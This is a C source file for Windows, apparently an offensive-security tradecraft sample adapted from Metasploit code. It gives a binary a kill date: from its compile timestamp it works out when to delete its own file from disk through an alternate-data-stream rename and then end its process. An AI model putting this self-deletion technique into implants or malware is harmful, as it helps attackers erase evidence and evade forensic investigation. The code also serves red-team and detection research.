#include <Windows.h>
#include <stdio.h>



//------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Edit the following KILL_* constants to configure the kill date:

#define KILL_DAY				0x01		// Ex: 1 - Meaning after 1 day, the binary will self-kill
#define KILL_HOUR				0x02		// Ex: 10 - Meaning after 10 hours, the binary will self-kill
#define KILL_MINUTE				0x00		// Ex: 1 - Meaning after 1 minute, the binary will self-kill

//------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Macros used to set the kill date:

#define MINUTES_TO_SEC(Mins)	(Mins * 60)			// Converts minutes to seconds
#define HOURS_TO_SEC(Hrs)		(Hrs  * 3600)		// Converts hours to seconds
#define DAYS_TO_SEC(Days)		(Days * 86400)		// Converts days to seconds

// The kill date in seconds:
#define KILL_DATE				(DAYS_TO_SEC(KILL_DAY) + HOURS_TO_SEC(KILL_HOUR) + MINUTES_TO_SEC(KILL_MINUTE))

//------------------------------------------------------------------------------------------------------------------------------------------------------------------

#define NEW_STREAM			L":%x%x\x00"

// Macro used to print errors
#define REPORT_ERROR(szApiName, _GOTO)												\
	printf("[!] \"%ws\" Failed With Error: %d \n", szApiName, GetLastError());		\
	goto _GOTO;

//------------------------------------------------------------------------------------------------------------------------------------------------------------------

typedef struct _FILE_RENAME_INFO2 {
#if (_WIN32_WINNT >= _WIN32_WINNT_WIN10_RS1)
	union {
		BOOLEAN ReplaceIfExists;
		DWORD Flags;
	} DUMMYUNIONNAME;
#else
	BOOLEAN ReplaceIfExists;
#endif
	HANDLE RootDirectory;
	DWORD FileNameLength;
	WCHAR FileName[MAX_PATH]; // Instead of "WCHAR FileName[0]" (See FILE_RENAME_INFO's original documentation)
} FILE_RENAME_INFO2, * PFILE_RENAME_INFO2;

//------------------------------------------------------------------------------------------------------------------------------------------------------------------

BOOL DeleteSelfFromDisk() {

	BOOL                    bResult						= FALSE;
	HANDLE                  hFile						= INVALID_HANDLE_VALUE;
	FILE_DISPOSITION_INFO   DisposalInfo				= { .DeleteFile = TRUE };
	FILE_RENAME_INFO2       RenameInfo					= { .FileNameLength = sizeof(NEW_STREAM), .ReplaceIfExists = FALSE, .RootDirectory = 0x00 };
	WCHAR					szFileName [MAX_PATH * 2]	= { 0x00 };

	swprintf(RenameInfo.FileName, MAX_PATH, NEW_STREAM, rand(), rand() * rand());

	if (GetModuleFileNameW(NULL, szFileName, (MAX_PATH * 2)) == 0x00) {
		REPORT_ERROR(TEXT("GetModuleFileNameW"), _FUNC_CLEANUP);
	}

	hFile = CreateFileW(szFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		REPORT_ERROR(TEXT("CreateFileW [R]"), _FUNC_CLEANUP);
	}

	if (!SetFileInformationByHandle(hFile, FileRenameInfo, &RenameInfo, sizeof(RenameInfo))) {
		REPORT_ERROR(TEXT("SetFileInformationByHandle [R]"), _FUNC_CLEANUP);
	}

	CloseHandle(hFile);

	hFile = CreateFileW(szFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		REPORT_ERROR(TEXT("CreateFileW [D]"), _FUNC_CLEANUP);
	}

	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &DisposalInfo, sizeof(DisposalInfo))) {
		REPORT_ERROR(TEXT("SetFileInformationByHandle [D]"), _FUNC_CLEANUP);
	}

	bResult = TRUE;

_FUNC_CLEANUP:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return bResult;
}


//------------------------------------------------------------------------------------------------------------------------------------------------------------------

// https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/metsrv/metsrv.c#L82
BOOL GetCurrentUnixTime(OUT INT* CurrentTime) {

	SYSTEMTIME			SysTime		= { 0x00 };
	FILETIME			FileTime	= { 0x00 };
	ULARGE_INTEGER		ULargeInt	= { 0x00 };

	GetSystemTime(&SysTime);

	if (!SystemTimeToFileTime(&SysTime, &FileTime))
		return FALSE;

	ULargeInt.LowPart	= FileTime.dwLowDateTime;
	ULargeInt.HighPart	= FileTime.dwHighDateTime;

	*CurrentTime = (long)((ULargeInt.QuadPart - 116444736000000000) / 10000000L);

	return TRUE;
}


BOOL GetLocalPeTimeStamp(OUT INT* TimeStamp) {

	ULONG_PTR				uLocalImgHandle		= NULL;
	PIMAGE_NT_HEADERS		pImgNtHdrs			= NULL;

	if (!(uLocalImgHandle = (ULONG_PTR)GetModuleHandle(NULL)))
		return FALSE;

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uLocalImgHandle + ((PIMAGE_DOS_HEADER)uLocalImgHandle)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;


	*TimeStamp = (int)pImgNtHdrs->FileHeader.TimeDateStamp;

	return *TimeStamp ? TRUE : FALSE;
}

//------------------------------------------------------------------------------------------------------------------------------------------------------------------

// https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/metsrv/metsrv.c#L101
VOID DelayExecutionThenKill(IN INT DelayTime) {

	while (DelayTime > MAXDWORD){
		Sleep(MAXDWORD);
		DelayTime -= MAXDWORD;
	}

	printf("[i] Killing Self After %d Seconds \n", DelayTime);
	Sleep(DelayTime * 1000);

	// After sleep is done, self-kill:
	DeleteSelfFromDisk();
	TerminateProcess((HANDLE)-1, 1);
}

//------------------------------------------------------------------------------------------------------------------------------------------------------------------


BOOL SelfDeleteAtKillDate() {

	INT T1		= 0x00,
		T2		= 0x00,
		Delta	= 0x00;

	// Get binary compilation date
	if (!GetLocalPeTimeStamp(&T1))
		return FALSE;

	// Get current date
	if (!GetCurrentUnixTime(&T2))
		return FALSE;

	// 'Delta' represent the time the binary exist for after compilation
	Delta = T2 - T1;

	// If it exists beyond the kill date, self delete
	if (Delta >= KILL_DATE) {
		DeleteSelfFromDisk();
		TerminateProcess((HANDLE)-1, 1);
	}
	// Otherwise, sleep till we reach the kill date
	else
		DelayExecutionThenKill((KILL_DATE - Delta));
	
	return TRUE;
}


//------------------------------------------------------------------------------------------------------------------------------------------------------------------

int main() {

	HANDLE hThread = NULL;
	
	if (!(hThread = CreateThread(NULL, 0x00, SelfDeleteAtKillDate, NULL, 0x00, NULL)))
		return -1;
	

	// Just for demo (set the kill date to 1 minute):
	WaitForSingleObject(hThread, INFINITE);
	
	/*
		One should not wait for the thread to finish, because if the kill date is in days, the binary will not proceed to execute the payload (for example)
	*/

	

	return 0;
}


